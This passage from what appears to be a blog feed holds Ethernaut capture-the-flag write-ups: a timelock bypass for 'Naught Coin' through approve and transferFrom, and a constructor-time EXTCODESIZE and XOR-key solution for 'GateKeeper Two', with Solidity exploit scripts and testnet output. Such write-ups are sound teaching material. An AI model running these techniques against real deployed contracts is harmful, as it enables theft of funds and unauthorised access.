gweiEstimated total gas used <span class=\"k\">for </span>script: 327554Estimated amount required: 0.017196585 ETH<span class=\"o\">==========================</span>Enter keystore password:<span class=\"c\">##### 1001</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xbe01e24783ab42cd7662f2f25ed08617ff5d23ab1cf049118da11b30657d30e6Contract Address: 0x21dA2776E60d5FAB93773eE66b547c54038350C4Block: 185739056Paid: 0.0065975525 ETH <span class=\"o\">(</span>239911 gas <span class=\"k\">*</span> 27.5 gwei<span class=\"o\">)</span><span class=\"c\">##### 1001</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x4d6913ae6d8cb717ff25cd1d5fd1bb3f836b1678b435e445b030ec1f8c4f4fe4Block: 185739056Paid: 0.000976855 ETH <span class=\"o\">(</span>35522 gas <span class=\"k\">*</span> 27.5 gwei<span class=\"o\">)</span><span class=\"c\">##### 1001</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x4442bf1e8285f7fbf1b46c906cfc03367926bdd3ac633b8c7fe653c8e2c63481Block: 185739056Paid: 0.0009108 ETH <span class=\"o\">(</span>33120 gas <span class=\"k\">*</span> 27.5 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on 1001 | Total Paid: 0.0084852075 ETH (308553 gas * avg 27.5 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div>",
            "url": "https://0o3q.github.io/2025/05/15/preservation",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","delegatecall","storage"],
            
            "date_published": "2025-05-15T00:00:00+09:00",
            "date_modified": "2025-05-15T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/05/01/naughtcoin",
            "title": "[Ethernaut] 15.Naught Coin",
            "summary": null,
            "content_text": "AnalysisThe goal is  getting your token balance to 0// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\";contract NaughtCoin is ERC20 {    // string public constant name = 'NaughtCoin';    // string public constant symbol = '0x0';    // uint public constant decimals = 18;    uint256 public timeLock = block.timestamp + 10 * 365 days;    uint256 public INITIAL_SUPPLY;    address public player;    constructor(address _player) ERC20(\"NaughtCoin\", \"0x0\") {        player = _player;        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));        // _totalSupply = INITIAL_SUPPLY;        // _balances[player] = INITIAL_SUPPLY;        _mint(player, INITIAL_SUPPLY);        emit Transfer(address(0), player, INITIAL_SUPPLY);    }    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {        super.transfer(_to, _value);    }    // Prevent the initial owner from transferring tokens until the timelock has passed    modifier lockTokens() {        if (msg.sender == player) {            require(block.timestamp &gt; timeLock);            _;        } else {            _;        }    }}timeLock is set to 10 years after the block was createdThis code should be read:openzeppelin-contracts-08/token/ERC20/ERC20.solExploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/NaughtCoin.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";import \"openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol\";contract Ex {    function ex(NaughtCoin nc_, address _player, uint256 _token) external{        nc_.transferFrom(_player, address(this), _token);    }}contract NaughtCoinSol is Script {    NaughtCoin public nc_ = NaughtCoin(0x6bF577FBb92fcE9F1480EbBeD1aC0403b21025b2);    uint256 public token = nc_.INITIAL_SUPPLY();    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Balances: \", nc_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        Ex ex = new Ex();        nc_.approve(address(ex), token);        ex.ex(nc_, vm.envAddress(\"MY_ADDRESS\"), token);        console.log(\"Balances: \", nc_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));                vm.stopBroadcast();    }}The transferFrom function can retrieve tokens up to the approved amount if approval was previously granted through the approve function.After creating the Ex contract and granting approval, tokens can be retrieved from the Ex contract using the transferFrom function without the timeLock restriction.$ forge script script/NaughtCoinSol.sol:NaughtCoinSol --broadcast[‚†í] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Balances:  1000000000000000000000000  Balances:  0## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001008466 gweiEstimated total gas used for script: 410540Estimated amount required: 0.00000041401563164 ETH==========================‚†Ç Sequence #1 on holesky | Waiting for pending transactions    ‚†† [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ‚°Ä [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749‚¢Ä Sequence #1 on holesky | Waiting for pending transactions    ‚°Ä [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ‚†Ñ [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749‚†Å Sequence #1 on holesky | Waiting for pending transactions    ‚†Ç [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ‚†ê [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749‚†Å Sequence #1 on holesky | Waiting for pending transactions    ‚†Å [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ‚†† [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749##### holesky‚úÖ  [Success] Hash: 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3Contract Address: 0x5027B78a821BB27bd371F0699bC6CDC12778C34eBlock: 3767317Paid: 0.000000210921904108 ETH (209156 gas * 0.001008443 gwei)##### holesky‚úÖ  [Success] Hash: 0x393caf180b8749d4deac62bc9e0c2905ec4ee8cf3f243272f2c115cccf935125Block: 3767317Paid: 0.000000054534580554 ETH (54078 gas * 0.001008443 gwei)##### holesky‚úÖ  [Success] Hash: 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749Block: 3767317Paid: 0.000000046685868685 ETH (46295 gas * 0.001008443 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000312142353347 ETH (309529 gas * avg 0.001008443 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>getting your token balance to 0</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">NaughtCoin</span> <span class=\"k\">is</span> <span class=\"n\">ERC20</span> <span class=\"p\">{</span>    <span class=\"c1\">// string public constant name = 'NaughtCoin';</span>    <span class=\"c1\">// string public constant symbol = '0x0';</span>    <span class=\"c1\">// uint public constant decimals = 18;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">timeLock</span> <span class=\"o\">=</span> <span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span> <span class=\"o\">+</span> <span class=\"mi\">10</span> <span class=\"o\">*</span> <span class=\"mi\">365</span> <span class=\"kc\">days</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">INITIAL_SUPPLY</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">player</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_player</span><span class=\"p\">)</span> <span class=\"n\">ERC20</span><span class=\"p\">(</span><span class=\"s\">\"NaughtCoin\"</span><span class=\"p\">,</span> <span class=\"s\">\"0x0\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">player</span> <span class=\"o\">=</span> <span class=\"n\">_player</span><span class=\"p\">;</span>        <span class=\"n\">INITIAL_SUPPLY</span> <span class=\"o\">=</span> <span class=\"mi\">1000000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">10</span> <span class=\"o\">**</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"n\">decimals</span><span class=\"p\">()));</span>        <span class=\"c1\">// _totalSupply = INITIAL_SUPPLY;</span>        <span class=\"c1\">// _balances[player] = INITIAL_SUPPLY;</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"n\">player</span><span class=\"p\">,</span> <span class=\"n\">INITIAL_SUPPLY</span><span class=\"p\">);</span>        <span class=\"k\">emit</span> <span class=\"n\">Transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"n\">player</span><span class=\"p\">,</span> <span class=\"n\">INITIAL_SUPPLY</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_value</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">override</span> <span class=\"n\">lockTokens</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"n\">_value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Prevent the initial owner from transferring tokens until the timelock has passed</span>    <span class=\"k\">modifier</span> <span class=\"n\">lockTokens</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">player</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span> <span class=\"o\">&gt;</span> <span class=\"n\">timeLock</span><span class=\"p\">);</span>            <span class=\"n\">_</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">_</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">timeLock</code> is set to 10 years after the block was created</p><p>This code should be read:<a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/token/ERC20/ERC20.sol\">openzeppelin-contracts-08/token/ERC20/ERC20.sol</a></p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/NaughtCoin.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">NaughtCoin</span> <span class=\"n\">nc_</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_player</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_token</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">{</span>        <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"n\">_player</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">_token</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">NaughtCoinSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">NaughtCoin</span> <span class=\"k\">public</span> <span class=\"n\">nc_</span> <span class=\"o\">=</span> <span class=\"n\">NaughtCoin</span><span class=\"p\">(</span><span class=\"mh\">0x6bF577FBb92fcE9F1480EbBeD1aC0403b21025b2</span><span class=\"p\">);</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">token</span> <span class=\"o\">=</span> <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">INITIAL_SUPPLY</span><span class=\"p\">();</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Balances: \"</span><span class=\"p\">,</span> <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">ex</span><span class=\"p\">),</span> <span class=\"n\">token</span><span class=\"p\">);</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">nc_</span><span class=\"p\">,</span> <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">),</span> <span class=\"n\">token</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Balances: \"</span><span class=\"p\">,</span> <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>                <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The <code class=\"language-plaintext highlighter-rouge\">transferFrom</code> function can retrieve tokens up to the approved amount if approval was previously granted through the <code class=\"language-plaintext highlighter-rouge\">approve</code> function.</p><p>After creating the <code class=\"language-plaintext highlighter-rouge\">Ex</code> contract and granting approval, tokens can be retrieved from the <code class=\"language-plaintext highlighter-rouge\">Ex</code> contract using the <code class=\"language-plaintext highlighter-rouge\">transferFrom</code> function without the <code class=\"language-plaintext highlighter-rouge\">timeLock</code> restriction.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/NaughtCoinSol.sol:NaughtCoinSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†í] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Balances:  1000000000000000000000000  Balances:  0<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001008466 gweiEstimated total gas used <span class=\"k\">for </span>script: 410540Estimated amount required: 0.00000041401563164 ETH<span class=\"o\">==========================</span>‚†Ç Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ‚†† <span class=\"o\">[</span>Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ‚°Ä <span class=\"o\">[</span>Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749‚¢Ä Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ‚°Ä <span class=\"o\">[</span>Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ‚†Ñ <span class=\"o\">[</span>Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749‚†Å Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ‚†Ç <span class=\"o\">[</span>Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ‚†ê <span class=\"o\">[</span>Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749‚†Å Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ‚†Å <span class=\"o\">[</span>Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ‚†† <span class=\"o\">[</span>Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749<span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3Contract Address: 0x5027B78a821BB27bd371F0699bC6CDC12778C34eBlock: 3767317Paid: 0.000000210921904108 ETH <span class=\"o\">(</span>209156 gas <span class=\"k\">*</span> 0.001008443 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x393caf180b8749d4deac62bc9e0c2905ec4ee8cf3f243272f2c115cccf935125Block: 3767317Paid: 0.000000054534580554 ETH <span class=\"o\">(</span>54078 gas <span class=\"k\">*</span> 0.001008443 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749Block: 3767317Paid: 0.000000046685868685 ETH <span class=\"o\">(</span>46295 gas <span class=\"k\">*</span> 0.001008443 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000312142353347 ETH (309529 gas * avg 0.001008443 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div>",
            "url": "https://0o3q.github.io/2025/05/01/naughtcoin",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","ERC20"],
            
            "date_published": "2025-05-01T00:00:00+09:00",
            "date_modified": "2025-05-01T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/28/gatekeepertwo",
            "title": "[Ethernaut] 14.GateKeeper Two",
            "summary": null,
            "content_text": "AnalysisThe goal is  Register as an entrant to pass this level.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperTwo {    address public entrant;    modifier gateOne() {        require(msg.sender != tx.origin);        _;    }    modifier gateTwo() {        uint256 x;        assembly {            x := extcodesize(caller())        }        require(x == 0);        _;    }    modifier gateThree(bytes8 _gateKey) {        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);        _;    }    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {        entrant = tx.origin;        return true;    }}assembly keyword allows a contract to access functionality that is not native to vanilla Solidity.extcodesize call will get the size of a contract‚Äôs code at a given address.If the size of a contract‚Äôs code at a given address is zero, it indicates that the address is EOAHowever, this seems to conflict with gateOne() modifierIn section 7 of yellow paper, I found sentence:  ‚ÄúDuring initialization code execution, EXTCODESIZE on the address should return zero‚ÄùI also found the concept ‚Äúinitialization code excution‚Äù in here.  üí° When a contract is created, its¬†constructor¬†(a function declared with the¬†constructor¬†keyword) is executed once.Solving the gateThree() modifier is straightforward if you use the properties of XOR:given uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max , derive uint64(_gateKey)  by computing uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).maxExploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/GateKeeperTwo.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(GatekeeperTwo gkt_) {        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);        gkt_.enter(gateKey);    }}contract GateKeeperTwoSol is Script {    GatekeeperTwo public gkt_ = GatekeeperTwo(0x1376d3d0070BE56e26c6F566EeC4fd975bD1aC63);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));            console.log(\"Before entrant: \", gkt_.entrant());        Ex ex = new Ex(gkt_);        console.log(\"After entrant: \", gkt_.entrant());        vm.stopBroadcast();    }}$ forge script script/GateKeeperTwoSol.sol:GateKeeperTwoSol --broadcast[‚†ä] Compiling...[‚†í] Compiling 26 files with Solc 0.8.29[‚†Ü] Compiling 4 files with Solc 0.6.12[‚†ë] Solc 0.6.12 finished in 42.16ms[‚†ò] Solc 0.8.29 finished in 335.40msCompiler run successful with warnings:Warning (2072): Unused local variable.  --&gt; script/GateKeeperTwoSol.sol:22:9:   |22 |         Ex ex = new Ex(gkt_);   |         ^^^^^Script ran successfully.== Logs ==  Before entrant:  0x0000000000000000000000000000000000000000  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.00107283 gweiEstimated total gas used for script: 135274Estimated amount required: 0.00000014512600542 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xe75e5f11118632a6eab29c325a0fdaa1891b6b082a341d628eb26f3b155cc2a1Contract Address: 0x4D05500E91144D2F8aa3A2E54050659eC22bD6c2Block: 3750329Paid: 0.000000111634638854 ETH (104057 gas * 0.001072822 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000111634638854 ETH (104057 gas * avg 0.001072822 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Register as an entrant to pass this level.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">GatekeeperTwo</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">entrant</span><span class=\"p\">;</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateOne</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">!=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateTwo</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">x</span><span class=\"p\">;</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">x</span> <span class=\"o\">:=</span> <span class=\"n\">extcodesize</span><span class=\"p\">(</span><span class=\"n\">caller</span><span class=\"p\">())</span>        <span class=\"p\">}</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">x</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">))))</span> <span class=\"o\">^</span> <span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"k\">type</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">).</span><span class=\"n\">max</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">enter</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">gateOne</span> <span class=\"n\">gateTwo</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">entrant</span> <span class=\"o\">=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">assembly</code> keyword allows a contract to access functionality that is not native to vanilla Solidity.</p><p><code class=\"language-plaintext highlighter-rouge\">extcodesize</code> call will get the size of a contract‚Äôs code at a given address.</p><p>If the size of a contract‚Äôs code at a given address is zero, it indicates that the address is EOA</p><p>However, this seems to conflict with <code class=\"language-plaintext highlighter-rouge\">gateOne()</code> modifier</p><p>In section 7 of <a href=\"https://ethereum.github.io/yellowpaper/paper.pdf\">yellow paper</a>, I found sentence:</p><blockquote>  <p>‚ÄúDuring initialization code execution, EXTCODESIZE on the address should return zero‚Äù</p></blockquote><p>I also found the concept ‚Äúinitialization code excution‚Äù in <a href=\"https://docs.soliditylang.org/en/latest/contracts.html#creating-contracts\">here</a>.</p><blockquote>  <p>üí° When a contract is <strong>created</strong>, its¬†<a href=\"https://docs.soliditylang.org/en/latest/contracts.html#constructor\">constructor</a>¬†(a function declared with the¬†<code class=\"language-plaintext highlighter-rouge\">constructor</code>¬†keyword) is executed once.</p></blockquote><p>Solving the <code class=\"language-plaintext highlighter-rouge\">gateThree()</code> modifier is straightforward if you use the properties of XOR:</p><p>given <code class=\"language-plaintext highlighter-rouge\">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max</code> , derive <code class=\"language-plaintext highlighter-rouge\">uint64(_gateKey)</code>  by computing <code class=\"language-plaintext highlighter-rouge\">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</code></p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/GateKeeperTwo.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">GatekeeperTwo</span> <span class=\"n\">gkt_</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">bytes8</span> <span class=\"n\">gateKey</span> <span class=\"o\">=</span> <span class=\"kt\">bytes8</span><span class=\"p\">(</span><span 